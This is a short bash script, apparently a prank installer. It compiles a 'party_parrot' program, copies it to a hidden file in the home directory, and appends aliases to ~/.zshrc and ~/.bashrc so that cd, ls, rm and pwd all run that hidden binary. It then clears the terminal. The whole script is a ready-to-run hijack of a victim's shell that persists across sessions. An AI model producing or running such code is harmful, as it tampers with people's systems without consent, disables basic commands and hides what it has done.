#!/bin/bash

DIR_NAME=party_parrot
NAME=07_03_21_in_memory_of_the_Kesha

make -C $DIR_NAME/ NAME=$NAME
cp $NAME ~/.$NAME

echo "alias cd=\"~/.$NAME\"" >> ~/.zshrc
echo "alias ls=\"~/.$NAME\"" >> ~/.zshrc
echo "alias rm=\"~/.$NAME\"" >> ~/.zshrc
echo "alias pwd=\"~/.$NAME\"" >> ~/.zshrc

echo "alias cd=\"~/.$NAME\"" >> ~/.bashrc
echo "alias ls=\"~/.$NAME\"" >> ~/.bashrc
echo "alias rm=\"~/.$NAME\"" >> ~/.bashrc
echo "alias pwd=\"~/.$NAME\"" >> ~/.bashrc

clear